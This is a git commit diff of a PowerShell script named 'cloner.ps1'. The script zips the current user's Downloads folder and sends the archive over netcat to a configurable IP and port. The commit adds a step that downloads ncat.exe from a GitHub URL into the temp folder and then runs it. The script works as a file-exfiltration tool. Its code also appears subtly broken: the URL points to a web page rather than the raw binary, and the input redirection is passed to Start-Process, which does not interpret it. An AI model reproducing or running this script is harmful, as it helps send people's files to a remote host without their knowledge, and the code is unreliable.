b167c2136ec13a05558030866f7415eb380dcaee
josh green <bcsjoshgreen25@gmail.com>
2024-06-02 00:31:09 +0300

    Update Downloads:cloner.ps1

--- Downloads:cloner.ps1
+++ Downloads:cloner.ps1
@@ -1,9 +1,13 @@
 # Parameters
 $downloadsFolder = "$env:USERPROFILE\Downloads"
 $zipFilePath = "$env:TEMP\Downloads.zip"
-$ncPath = "C:\path\to\nc.exe"  # Update this path to where your nc.exe is located
+$ncatUrl = "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe"  # URL to download ncat
+$ncatPath = "$env:TEMP\ncat.exe"  # Path to save downloaded ncat
 $targetIP = "127.0.0.1"  # Update this to the receiver's IP address
 $targetPort = 12345
+
+# Download ncat
+Invoke-WebRequest -Uri $ncatUrl -OutFile $ncatPath
 
 # Create a ZIP file of the Downloads folder
 if (Test-Path $zipFilePath) {
@@ -14,6 +18,6 @@ Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
 [System.IO.Compression.ZipFile]::CreateFromDirectory($downloadsFolder, $zipFilePath)
 
 # Send the ZIP file via Netcat
-Start-Process -FilePath $ncPath -ArgumentList "$targetIP $targetPort < $zipFilePath" -NoNewWindow -Wait
+Start-Process -FilePath $ncatPath -ArgumentList "$targetIP $targetPort < $zipFilePath" -NoNewWindow -Wait
 
 Write-Output "Transfer completed successfully."
